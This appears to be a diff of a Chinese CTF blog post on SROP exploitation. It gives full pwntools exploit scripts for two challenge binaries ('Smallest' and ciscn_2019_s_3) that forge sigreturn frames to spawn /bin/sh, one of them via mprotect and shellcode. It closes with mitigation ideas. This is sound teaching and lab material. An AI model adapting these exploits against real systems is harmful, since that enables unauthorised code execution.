+───────────────────────────────── SROP info ──────────────────────────────────
+       ss_size:0x0000000000000000           rsi:0x0000000000000000
+           rax:0x000000000000003b           rbp:0x0000000000000000
+        eflags:0x0000000000000000           rcx:0x0000000000000000
+           rip:0x000000000040011b           r13:0x0000000000000000
+           cr2:0x0000000000000000           r12:0x0000000000000000
+           rbx:0x0000000000000000       uc_link:0x0000000000000000
+           err:0x0000000000000000        trapno:0x0000000000000000
+           r10:0x0000000000000000      ss_flags:0x0000000000000000
+         ss_sp:0x0000000000000000           rdi:0x0000000000600280
+      uc_flags:0x0000000000000000           r14:0x0000000000000000
+            r8:0x0000000000000000      selector:0x0000000000000033
+            r9:0x0000000000000000           rdx:0x0000000000000000
+           rsp:0x0000000000000000       oldmask:0x0000000000000000
+           r11:0x0000000000000000           r15:0x0000000000000000
+
+...
+
+──────────────────────────────────── Code ────────────────────────────────────
+   0x40010a &lt;main+34&gt;:    mov    rax,0xf
+   0x400111 &lt;main+41&gt;:    mov    rdi,0x0
+   0x400118 &lt;main+48&gt;:    mov    rsp,rsi
+=&gt; 0x40011b &lt;main+51&gt;:    syscall
+   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;
+   0x40011f &lt;main+55&gt;:    mov    rax,0x3c
+   0x400126 &lt;main+62&gt;:    mov    rdi,0x0
+   0x40012d &lt;main+69&gt;:    syscall
+────────────────────────────── System call info ──────────────────────────────
+execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)
+const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)
+const char *const *argv : 0x0
+const char *const *envp : 0x0
+</code></pre>
 <h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./smallest</span><br><span class="line">[*] <span class="string">'/home/beale/SROP/2017-360Chunqiu-Smallest/smallest'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$ checksec ./smallest
+[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
 <h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ./smallest -M intel</span><br><span class="line"></span><br><span class="line">./smallest:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004000b0 &lt;.text&gt;:</span><br><span class="line">  4000b0:	48 31 c0             	xor    rax,rax</span><br><span class="line">  4000b3:	ba 00 04 00 00       	mov    edx,0x400</span><br><span class="line">  4000b8:	48 89 e6             	mov    rsi,rsp</span><br><span class="line">  4000bb:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  4000be:	0f 05                	syscall</span><br><span class="line">  4000c0:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$ objdump -d ./smallest -M intel
+
+./smallest:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+00000000004000b0 &lt;.text&gt;:
+  4000b0:    48 31 c0                 xor    rax,rax
+  4000b3:    ba 00 04 00 00           mov    edx,0x400
+  4000b8:    48 89 e6                 mov    rsi,rsp
+  4000bb:    48 89 c7                 mov    rdi,rax
+  4000be:    0f 05                    syscall
+  4000c0:    c3                       ret
+</code></pre>
 <p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./smallest'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./smallest'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4000b0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000be</span></span><br><span class="line"></span><br><span class="line">payload = p64(main_addr) * <span class="number">3</span> <span class="comment"># 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入</span></span><br><span class="line">raw_input(<span class="string">'@main*3'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xb3'</span> <span class="comment"># 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址</span></span><br><span class="line">raw_input(<span class="string">'@leak stack'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">'stack_addr = '</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(main_addr) + p64(syscall_addr) <span class="comment"># main为了之后的输入，syscall_ret用来调用sigreturn</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read <span class="comment"># sys_read的调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x400</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame) <span class="comment"># 读0x400个字节到新的栈上，并把栈搬到新的栈上</span></span><br><span class="line">raw_input(<span class="string">'@fake sigcontext to pivot stack'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">15</span>, <span class="string">'A'</span>) <span class="comment"># 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）</span></span><br><span class="line">raw_input(<span class="string">'@set rax=15'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面开始往新的栈上写东西</span></span><br><span class="line">bin_sh_addr = stack_addr + <span class="number">2</span> * <span class="number">8</span> + len(SigreturnFrame()) <span class="comment"># 设置“/bin/sh”字符串的地址</span></span><br><span class="line">payload = p64(main_addr) + p64(syscall_addr) <span class="comment"># main为了之后的输入，syscall_ret用来调用sigreturn</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve <span class="comment"># sys_execve的调用号</span></span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame) + <span class="string">'/bin/sh\x00'</span> <span class="comment"># 开shell</span></span><br><span class="line">raw_input(<span class="string">'@fake sigcontext to exec shell'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(syscall_addr).ljust(<span class="number">15</span>, <span class="string">'A'</span>) <span class="comment"># 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）</span></span><br><span class="line">raw_input(<span class="string">'@set rax=15'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+#-*- encoding=utf-8 -*-
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]
+
+p = process(&#39;./smallest&#39;)
+elf = ELF(&#39;./smallest&#39;)
+
+#gdb.attach(p)
+
+main_addr = 0x4000b0
+syscall_addr = 0x4000be
+
+payload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入
+raw_input(&#39;@main*3&#39;)
+p.send(payload)
+
+payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址
+raw_input(&#39;@leak stack&#39;)
+p.send(payload)
+p.recv(8)
+stack_addr = u64(p.recv(8))
+info(&#39;stack_addr = &#39; + hex(stack_addr))
+
+payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
+frame = SigreturnFrame()
+frame.rax = constants.SYS_read # sys_read的调用号
+frame.rdi = 0
+frame.rsi = stack_addr
+frame.rdx = 0x400
+frame.rsp = stack_addr
+frame.rip = syscall_addr
+payload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上
+raw_input(&#39;@fake sigcontext to pivot stack&#39;)
+p.send(payload)
+
+payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
+raw_input(&#39;@set rax=15&#39;)
+p.send(payload)
+
+# 下面开始往新的栈上写东西
+bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址
+payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturn
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve # sys_execve的调用号
+frame.rdi = bin_sh_addr
+frame.rip = syscall_addr
+payload += str(frame) + &#39;/bin/sh\x00&#39; # 开shell
+raw_input(&#39;@fake sigcontext to exec shell&#39;)
+p.send(payload)
+
+payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）
+raw_input(&#39;@set rax=15&#39;)
+p.send(payload)
+
+p.interactive()
+</code></pre>
 <p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(main_addr) + p64(syscall_addr)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = stack_addr &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x108</span> <span class="comment"># 设置栈的位置</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += p64(stack_addr + <span class="number">0x110</span>) <span class="comment"># 设置return的地址</span></span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)
+frame = SigreturnFrame()
+frame.rax = constants.SYS_mprotect
+frame.rdi = stack_addr &amp; 0xfffffffffffff000
+frame.rsi = 0x1000
+frame.rdx = 0x7
+frame.rsp = stack_addr + 0x108 # 设置栈的位置
+frame.rip = syscall_addr
+payload += str(frame)
+payload += p64(stack_addr + 0x110) # 设置return的地址
+payload += asm(shellcraft.sh())
+p.send(payload)
+</code></pre>
 <h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./ciscn_s_3</span><br><span class="line">[*] <span class="string">'/root/tmp/ciscn_2019_s_3/ciscn_s_3'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$ checksec ./ciscn_s_3
+[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
 <h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">000000000040051d &lt;main&gt;:</span><br><span class="line">  40051d:	55                   	push   rbp</span><br><span class="line">  40051e:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  400521:	48 83 ec 10          	sub    rsp,0x10</span><br><span class="line">  400525:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">  400528:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">  40052c:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  400531:	e8 b7 ff ff ff       	call   4004ed &lt;vuln&gt;</span><br><span class="line">  400536:	90                   	nop</span><br><span class="line">  400537:	c9                   	leave</span><br><span class="line">  400538:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<pre><code class="asm">000000000040051d &lt;main&gt;:
+  40051d:    55                       push   rbp
+  40051e:    48 89 e5                 mov    rbp,rsp
+  400521:    48 83 ec 10              sub    rsp,0x10
+  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi
+  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi
+  40052c:    b8 00 00 00 00           mov    eax,0x0
+  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;
+  400536:    90                       nop
+  400537:    c9                       leave
+  400538:    c3                       ret
+</code></pre>
 <p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00000000004004ed &lt;vuln&gt;:</span><br><span class="line">  4004ed:	55                   	push   rbp</span><br><span class="line">  4004ee:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  4004f1:	48 31 c0             	xor    rax,rax</span><br><span class="line">  4004f4:	ba 00 04 00 00       	mov    edx,0x400</span><br><span class="line">  4004f9:	48 8d 74 24 f0       	lea    rsi,[rsp-0x10]</span><br><span class="line">  4004fe:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  400501:	0f 05                	syscall</span><br><span class="line">  400503:	48 c7 c0 01 00 00 00 	mov    rax,0x1</span><br><span class="line">  40050a:	ba 30 00 00 00       	mov    edx,0x30</span><br><span class="line">  40050f:	48 8d 74 24 f0       	lea    rsi,[rsp-0x10]</span><br><span class="line">  400514:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  400517:	0f 05                	syscall</span><br><span class="line">  400519:	c3                   	ret</span><br><span class="line">  40051a:	90                   	nop</span><br><span class="line">  40051b:	5d                   	pop    rbp</span><br><span class="line">  40051c:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<pre><code class="asm">00000000004004ed &lt;vuln&gt;:
+  4004ed:    55                       push   rbp
+  4004ee:    48 89 e5                 mov    rbp,rsp
+  4004f1:    48 31 c0                 xor    rax,rax
+  4004f4:    ba 00 04 00 00           mov    edx,0x400
+  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]
+  4004fe:    48 89 c7                 mov    rdi,rax
+  400501:    0f 05                    syscall
+  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1
+  40050a:    ba 30 00 00 00           mov    edx,0x30
+  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]
+  400514:    48 89 c7                 mov    rdi,rax
+  400517:    0f 05                    syscall
+  400519:    c3                       ret
+  40051a:    90                       nop
+  40051b:    5d                       pop    rbp
+  40051c:    c3                       ret
+</code></pre>
 <p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004004d6 &lt;gadgets&gt;:</span><br><span class="line">  4004d6:	55                   	push   rbp</span><br><span class="line">  4004d7:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  4004da:	48 c7 c0 0f 00 00 00 	mov    rax,0xf</span><br><span class="line">  4004e1:	c3                   	ret</span><br><span class="line">  4004e2:	48 c7 c0 3b 00 00 00 	mov    rax,0x3b</span><br><span class="line">  4004e9:	c3                   	ret</span><br><span class="line">  4004ea:	90                   	nop</span><br><span class="line">  4004eb:	5d                   	pop    rbp</span><br><span class="line">  4004ec:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:
+  4004d6:    55                       push   rbp
+  4004d7:    48 89 e5                 mov    rbp,rsp
+  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf
+  4004e1:    c3                       ret
+  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b
+  4004e9:    c3                       ret
+  4004ea:    90                       nop
+  4004eb:    5d                       pop    rbp
+  4004ec:    c3                       ret
+</code></pre>
 <p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p>
 <h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminal = ['lxterminal', '-e']</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  p = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28526</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004f1</span></span><br><span class="line">set_sigreturn_addr = <span class="number">0x4004da</span></span><br><span class="line">set_execve_addr = <span class="number">0x4004e2</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">16</span>, <span class="string">'A'</span>) + p64(vuln_addr)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">'stack_addr = '</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">payload = p64(set_sigreturn_addr) + p64(syscall_ret)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">payload += str(frame)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+context.log_level = &#39;debug&#39;
+#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]
+
+local = 0
+if local:
+  p = process(&#39;./ciscn_s_3&#39;)
+else:
+    p = remote(&#39;node3.buuoj.cn&#39;, 28526)
+
+#gdb.attach(p)
+
+vuln_addr = 0x4004f1
+set_sigreturn_addr = 0x4004da
+set_execve_addr = 0x4004e2
+syscall_ret = 0x400517
+
+payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)
+raw_input(&#39;@&#39;)
+p.send(payload)
+p.recv(32)
+stack_addr = u64(p.recv(8))
+info(&#39;stack_addr = &#39; + hex(stack_addr))
+
+bin_sh_addr = stack_addr - 0x118
+payload = p64(set_sigreturn_addr) + p64(syscall_ret)
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = bin_sh_addr
+frame.rip = syscall_ret
+payload += str(frame)
+raw_input(&#39;@&#39;)
+p.send(payload)
+
+p.interactive()
+</code></pre>
 <h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p>
 <h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p>
 <h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p>
 <h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/03/14/Use-SROP-with-ret2VDSO/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Use SROP with ret2VDSO</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/03/06/Linux下的各类程序保护机制/">
+                        <span>Linux下的各类程序保护机制</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
     </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
